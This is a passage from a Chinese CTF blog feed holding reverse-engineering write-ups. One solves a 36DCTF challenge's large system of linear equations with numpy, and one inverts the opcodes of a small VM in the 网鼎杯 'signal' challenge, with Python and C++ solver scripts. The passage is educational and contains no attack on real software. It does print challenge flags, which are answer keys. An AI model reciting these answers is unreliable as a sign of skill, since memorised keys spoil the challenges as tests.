class="hljs-number">21234</span> * v508 + <span class="hljs-number">16881</span> * v507 + <span class="hljs-number">33497</span> * v506 + <span class="hljs-number">44346</span> * v505 + <span class="hljs-number">34046</span> * v504 + <span class="hljs-number">62689</span> * v503 + <span class="hljs-number">61793</span> * v502 + <span class="hljs-number">39949</span> * v501 + <span class="hljs-number">51645</span> * v500 + <span class="hljs-number">45006</span> * v499 + <span class="hljs-number">30211</span> * v498 + <span class="hljs-number">36412</span> * v497 + <span class="hljs-number">50291</span> * v496 + <span class="hljs-number">61936</span> * v495 + <span class="hljs-number">24289</span> * v494 + <span class="hljs-number">36906</span> * v493 + <span class="hljs-number">39057</span> * v492 + <span class="hljs-number">37973</span> * v491 + <span class="hljs-number">38451</span> * v490 + <span class="hljs-number">44004</span> * v489 + <span class="hljs-number">36870</span> * v488 + <span class="hljs-number">41842</span> * v487 + <span class="hljs-number">56352</span> * v486 + <span class="hljs-number">44525</span> * v485 + <span class="hljs-number">55182</span> * v484 + <span class="hljs-number">61692</span> * v483 + <span class="hljs-number">22202</span> * v482 + <span class="hljs-number">46291</span> * v481 + <span class="hljs-number">43770</span> * v480 + <span class="hljs-number">33996</span> * v479 + <span class="hljs-number">16488</span> * v478 + <span class="hljs-number">41249</span> * v477 + <span class="hljs-number">30433</span> * v476 + <span class="hljs-number">19083</span> * v475 + <span class="hljs-number">64629</span> * v474 + <span class="hljs-number">39094</span> * v473 + <span class="hljs-number">20548</span> * v472 + v382;</span><br><span class="line">                                                                                                                                                                                                                                                                <span class="hljs-keyword">if</span> ( v383 + <span class="hljs-number">48644</span> * v514 == <span class="hljs-number">436619163</span> )</span><br><span class="line">                                                                                                                                                                                                                                                                {</span><br><span class="line">                                                                                                                                                                                                                                                                  v384 = <span class="hljs-number">20405</span> * v429 + <span class="hljs-number">55744</span> * v428 + <span class="hljs-number">53951</span> * v427 + <span class="hljs-number">58954</span> * v426 + <span class="hljs-number">58301</span> * v425 + <span class="hljs-number">43146</span> * v424 + <span class="hljs-number">50020</span> * v423 + <span class="hljs-number">57986</span> * v422 + <span class="hljs-number">32136</span> * v421 + <span class="hljs-number">54559</span> * v420 + <span class="hljs-number">36067</span> * v419 + <span class="hljs-number">55753</span> * v418 + <span class="hljs-number">52141</span> * v417 + <span class="hljs-number">19801</span> * v416 + <span class="hljs-number">51943</span> * v415 + <span class="hljs-number">52352</span> * v414 + <span class="hljs-number">59995</span> * v413 + <span class="hljs-number">61920</span> * v412 + <span class="hljs-number">21345</span> * v411 + <span class="hljs-number">36243</span> * v410 + <span class="hljs-number">24006</span> * v409 + <span class="hljs-number">57833</span> * v408 + <span class="hljs-number">60630</span> * v407 + <span class="hljs-number">26409</span> * v406 + <span class="hljs-number">55315</span> * v405 + <span class="hljs-number">55536</span> * v404 + <span class="hljs-number">56726</span> * v403 + <span class="hljs-number">35936</span> * v402 + <span class="hljs-number">52089</span> * v401 + <span class="hljs-number">23346</span> * v400 + <span class="hljs-number">37583</span> * v399 + <span class="hljs-number">28011</span> * v398 + <span class="hljs-number">63252</span> * v397 + <span class="hljs-number">45544</span> * v396 + <span class="hljs-number">31278</span> * v395 + <span class="hljs-number">53351</span> * v394 + <span class="hljs-number">59214</span> * v393 + <span class="hljs-number">56389</span> * v392 + <span class="hljs-number">21264</span> * v391 + <span class="hljs-number">43663</span> * v390 + <span class="hljs-number">50056</span> * v389 + <span class="hljs-number">29807</span> * v388 + <span class="hljs-number">54629</span> * s;</span><br><span class="line">                                                                                                                                                                                                                                                                  v385 = <span class="hljs-number">34777</span> * v471 + <span class="hljs-number">31197</span> * v470 + <span class="hljs-number">30616</span> * v469 + <span class="hljs-number">36452</span> * v468 + <span class="hljs-number">26811</span> * v467 + <span class="hljs-number">36716</span> * v466 + <span class="hljs-number">56574</span> * v465 + <span class="hljs-number">26609</span> * v464 + <span class="hljs-number">61561</span> * v463 + <span class="hljs-number">53940</span> * v462 + <span class="hljs-number">42728</span> * v461 + <span class="hljs-number">47488</span> * v460 + <span class="hljs-number">27142</span> * v459 + <span class="hljs-number">43536</span> * v458 + <span class="hljs-number">50520</span> * v457 + <span class="hljs-number">23098</span> * v456 + <span class="hljs-number">26887</span> * v455 + <span class="hljs-number">20179</span> * v454 + <span class="hljs-number">50829</span> * v453 + <span class="hljs-number">52275</span> * v452 + <span class="hljs-number">46516</span> * v451 + <span class="hljs-number">63611</span> * v450 + <span class="hljs-number">59165</span> * v449 + <span class="hljs-number">64759</span> * v448 + <span class="hljs-number">38581</span> * v447 + <span class="hljs-number">59893</span> * v446 + <span class="hljs-number">30951</span> * v445 + <span class="hljs-number">40268</span> * v444 + <span class="hljs-number">49167</span> * v443 + <span class="hljs-number">21028</span> * v442 + <span class="hljs-number">51890</span> * v441 + <span class="hljs-number">46565</span> * v440 + <span class="hljs-number">17053</span> * v439 + <span class="hljs-number">62330</span> * v438 + <span class="hljs-number">51110</span> * v437 + <span class="hljs-number">47835</span> * v436 + <span class="hljs-number">62399</span> * v435 + <span class="hljs-number">57967</span> * v434 + <span class="hljs-number">24624</span> * v433 + <span class="hljs-number">64106</span> * v432 + <span class="hljs-number">25896</span> * v431 + <span class="hljs-number">50027</span> * v430 + v384;</span><br><span class="line">                                                                                                                                                                                                                                                                  v386 = <span class="hljs-number">43090</span> * v513 + <span class="hljs-number">60146</span> * v512 + <span class="hljs-number">58416</span> * v511 + <span class="hljs-number">17103</span> * v510 + <span class="hljs-number">39414</span> * v509 + <span class="hljs-number">32649</span> * v508 + <span class="hljs-number">45967</span> * v507 + <span class="hljs-number">20158</span> * v506 + <span class="hljs-number">37299</span> * v505 + <span class="hljs-number">20670</span> * v504 + <span class="hljs-number">46301</span> * v503 + <span class="hljs-number">31897</span> * v502 + <span class="hljs-number">62016</span> * v501 + <span class="hljs-number">63284</span> * v500 + <span class="hljs-number">32156</span> * v499 + <span class="hljs-number">40720</span> * v498 + <span class="hljs-number">36471</span> * v497 + <span class="hljs-number">27360</span> * v496 + <span class="hljs-number">50777</span> * v495 + <span class="hljs-number">25651</span> * v494 + <span class="hljs-number">64743</span> * v493 + <span class="hljs-number">59790</span> * v492 + <span class="hljs-number">22455</span> * v491 + <span class="hljs-number">64238</span> * v490 + <span class="hljs-number">37757</span> * v489 + <span class="hljs-number">60849</span> * v488 + <span class="hljs-number">30086</span> * v487 + <span class="hljs-number">34636</span> * v486 + <span class="hljs-number">18797</span> * v485 + <span class="hljs-number">33985</span> * v484 + <span class="hljs-number">46073</span> * v483 + <span class="hljs-number">24947</span> * v482 + <span class="hljs-number">48851</span> * v481 + <span class="hljs-number">24773</span> * v480 + <span class="hljs-number">41489</span> * v479 + <span class="hljs-number">17636</span> * v478 + <span class="hljs-number">32373</span> * v477 + <span class="hljs-number">35731</span> * v476 + <span class="hljs-number">19021</span> * v475 + <span class="hljs-number">17532</span> * v474 + <span class="hljs-number">63794</span> * v473 + <span class="hljs-number">44087</span> * v472 + v385;</span><br><span class="line">                                                                                                                                                                                                                                                                  <span class="hljs-keyword">if</span> ( v386 + <span class="hljs-number">55482</span> * v514 == <span class="hljs-number">452784657</span> )</span><br><span class="line">                                                                                                                                                                                                                                                                  {</span><br><span class="line">                                                                                                                                                                                                                                                                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"YOU GET IT! YEEEEEAAA"</span>);</span><br><span class="line">                                                                                                                                                                                                                                                                    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">                                                                                                                                                                                                                                                                  }</span><br><span class="line">                                                                                                                                                                                                                                                                  .........</span><br></pre></td></tr></tbody></table></figure><p>观察一下很容易发现，这就是个简单的矩阵乘法，算<code>AX=b</code>，解起来很轻松，但是数据是在太多了，只能写脚本处理一下，本着简单使用的原则，把所有的数字找出来然后提取大于515的部分，就是所有用到的数，观察一下发现每一个处理变量的位置都是不变的，所以对应的数据的位置也是不变的，所以按照顺序提取一下就行了，最后再调整一下顺序就出来了</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np</span><br><span class="line"></span><br><span class="line">s = <span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'bigequition.txt'</span>, <span class="hljs-string">'r+'</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">    s += f.read()</span><br><span class="line">num = re.findall(<span class="hljs-string">'\d+'</span>, s)</span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> num:</span><br><span class="line">    tmp = <span class="hljs-built_in">int</span>(i)</span><br><span class="line">    <span class="hljs-keyword">if</span> tmp &gt; <span class="hljs-number">515</span>:</span><br><span class="line">        nums.append(tmp)</span><br><span class="line"></span><br><span class="line">arr = []</span><br><span class="line">result = []</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):</span><br><span class="line">    t_tmp = []</span><br><span class="line">    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):</span><br><span class="line">        t_tmp.append(nums[<span class="hljs-number">129</span> * i + j])</span><br><span class="line">    arr.append(t_tmp)</span><br><span class="line">    result.append(nums[<span class="hljs-number">129</span> * i + <span class="hljs-number">128</span>])</span><br><span class="line"><span class="hljs-comment"># print(arr)</span></span><br><span class="line"><span class="hljs-comment"># print(result)</span></span><br><span class="line">A = np.array(arr)</span><br><span class="line">B = np.array([result])</span><br><span class="line">b = np.transpose(B)</span><br><span class="line">A_inv = np.linalg.inv(A)</span><br><span class="line">x = np.dot(A_inv, b)</span><br><span class="line">x = np.rint(x)</span><br><span class="line">flag = <span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">43</span>):</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(x[<span class="hljs-number">42</span> - i]))</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">42</span>):</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(x[<span class="hljs-number">43</span> + <span class="hljs-number">41</span> - i]))</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">42</span>):</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(x[<span class="hljs-number">43</span> + <span class="hljs-number">42</span> + <span class="hljs-number">41</span> - i]))</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(x[-<span class="hljs-number">1</span>]))</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># flag{Soooo000_LooOOOOOOOOggO99g99_s1muLtaNeOus_EEEQuat10n5_Y0UUUUUUuuu_cAA44AANNnnN_SOOOOOOLVE_IT17TT11771ITIT!!!_8ShotDshP90ab}</span></span><br></pre></td></tr></tbody></table></figure><p><del>本来没想到这题这么简单，放假玩了一天晚上睡前才看了一眼，错过一血，错亿</del></p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> 36DCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯-wp</title>
      <link href="/2020/03/21/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
      <url>/2020/03/21/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>网鼎杯-wp</p><span id="more"></span><h4 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h4><p>很简单的<code>vm</code>，甚至可以一位一位解</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp+18h] [ebp-1D4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  <span class="hljs-built_in">qmemcpy</span>(&amp;v4, &amp;opcodes, <span class="hljs-number">0x1C8</span>u);</span><br><span class="line">  <span class="hljs-built_in">vm_operad</span>(&amp;v4, <span class="hljs-number">114</span>);</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"good,The answer format is:flag {}"</span>);</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>vm_operad</code>中包含了一些指令，很好理解，甚至不需要调试就可以看懂</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0xA</span>: read</span><br><span class="line"><span class="hljs-number">0x1</span>: 将结果写入target</span><br><span class="line"><span class="hljs-number">0x8</span>: 暂存计算结果到input</span><br><span class="line"><span class="hljs-number">0x7</span> x: input[i]==x ? i++ : <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>) </span><br><span class="line"><span class="hljs-number">0x2</span> x: input+x</span><br><span class="line"><span class="hljs-number">0x3</span> x: input-<span class="hljs-built_in">LOBYTE</span>(x)</span><br><span class="line"><span class="hljs-number">0x4</span> x: input^x</span><br><span class="line"><span class="hljs-number">0x5</span> x: input*x</span><br><span class="line"><span class="hljs-number">0x6</span> x: nop</span><br><span class="line"><span class="hljs-number">0xB</span>: input--</span><br><span class="line"><span class="hljs-number">0xC</span>: input++</span><br></pre></td></tr></tbody></table></figure><p><code>read</code>函数进行了输入的一些控制</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">size_t</span> __cdecl <span class="hljs-title">read</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">size_t</span> result; <span class="hljs-comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"string:"</span>);</span><br><span class="line">  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, a1);</span><br><span class="line">  result = <span class="hljs-built_in">strlen</span>(a1);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( result != <span class="hljs-number">15</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"WRONG!\n"</span>);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>flag的长度为15位，再观察<code>opcode</code>，可以发现是一位一位进行处理，经过一种运算然后<code>0x8</code>暂存，然后再经过一种计算将结果写入最终<code>target</code>，所以可以有两种解法，可以一位一位的逆<code>flag</code>，也可以逆<code>vm</code>的指令</p><ul><li><p>逐位计算<code>flag</code></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="hljs-number">0x22</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x31</span>,</span><br><span class="line">          <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x7A</span>]</span><br><span class="line">flag = <span class="hljs-string">""</span></span><br><span class="line">flag += <span class="hljs-built_in">chr</span>((target[<span class="hljs-number">0</span>] + <span class="hljs-number">5</span>) ^ <span class="hljs-number">0x10</span>)</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>((target[<span class="hljs-number">1</span>] // <span class="hljs-number">3</span>) ^ <span class="hljs-number">0x20</span>)</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>((target[<span class="hljs-number">2</span>] + <span class="hljs-number">1</span>) + <span class="hljs-number">2</span>)</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>((target[<span class="hljs-number">3</span>] - <span class="hljs-number">1</span>) ^ <span class="hljs-number">4</span>)</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>((target[<span class="hljs-number">4</span>] + <span class="hljs-number">0x21</span>)//<span class="hljs-number">3</span>)</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>(target[<span class="hljs-number">5</span>] + <span class="hljs-number">2</span>)</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>((target[<span class="hljs-number">6</span>] + <span class="hljs-number">0x20</span>) ^ <span class="hljs-number">0x9</span>)</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>((target[<span class="hljs-number">7</span>] ^ <span class="hljs-number">0x24</span>) - <span class="hljs-number">0x51</span>)</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>(target[<span class="hljs-number">8</span>])</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>((target[<span class="hljs-number">9</span>] - <span class="hljs-number">0x25</span>) // <span class="hljs-number">2</span>)</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>((target[<span class="hljs-number">10</span>] ^ <span class="hljs-number">0x41</span>) - <span class="hljs-number">0x36</span>)</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>(target[<span class="hljs-number">11</span>] - <span class="hljs-number">0x20</span>)</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>((target[<span class="hljs-number">12</span>] - <span class="hljs-number">0x25</span>) // <span class="hljs-number">3</span>)</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>((target[<span class="hljs-number">13</span>] + <span class="hljs-number">0x20</span>) ^ <span class="hljs-number">9</span>)</span><br><span class="line">flag += <span class="hljs-built_in">chr</span>((target[<span class="hljs-number">14</span>] - <span class="hljs-number">1</span>) - <span class="hljs-number">0x41</span>)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"><span class="hljs-comment"># 757515121f3d478</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>调整<code>vm</code>指令</p><p>把每一个运算改成逆运算，然后将每一位的两次计算交换顺序</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"ida.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">vm_operad</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *opcode, <span class="hljs-keyword">int</span> len)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> input[<span class="hljs-number">100</span>] = {<span class="hljs-number">0x22</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x31</span>,</span><br><span class="line">                               <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x7A</span>}; <span class="hljs-comment">// [esp+13h] [ebp-E5h]</span></span><br><span class="line">    <span class="hljs-keyword">char</span> v4[<span class="hljs-number">100</span>] = {<span class="hljs-number">0</span>}; <span class="hljs-comment">// [esp+77h] [ebp-81h]</span></span><br><span class="line">    string flag;</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">    <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">    <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">    <span class="hljs-keyword">int</span> v8; <span class="hljs-comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">    <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">    <span class="hljs-keyword">int</span> opcode_index; <span class="hljs-comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">    opcode_index = <span class="hljs-number">0</span>;</span><br><span class="line">    v9 = <span class="hljs-number">0</span>;</span><br><span class="line">    v8 = <span class="hljs-number">0</span>;</span><br><span class="line">    v7 = <span class="hljs-number">0</span>;</span><br><span class="line">    v6 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {</span><br><span class="line">        result = opcode_index;</span><br><span class="line">        <span class="hljs-keyword">if</span> (opcode_index &gt;= len) {</span><br><span class="line">            cout &lt;&lt; flag &lt;&lt; endl;</span><br><span class="line">            <span class="hljs-keyword">return</span> result;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (opcode[opcode_index]) {</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:</span><br><span class="line">                flag += v5;</span><br><span class="line">                ++opcode_index;</span><br><span class="line">                ++v7;</span><br><span class="line">                ++v9;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:</span><br><span class="line">                v5 = input[v9] - opcode[opcode_index + <span class="hljs-number">1</span>];</span><br><span class="line">                opcode_index += <span class="hljs-number">2</span>;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:</span><br><span class="line">                v5 = input[v9] + <span class="hljs-built_in">LOBYTE</span>(opcode[opcode_index + <span class="hljs-number">1</span>]);</span><br><span class="line">                opcode_index += <span class="hljs-number">2</span>;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:</span><br><span class="line">                v5 = opcode[opcode_index + <span class="hljs-number">1</span>] ^ input[v9];</span><br><span class="line">                opcode_index += <span class="hljs-number">2</span>;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:</span><br><span class="line">                v5 = input[v9] / opcode[opcode_index + <span 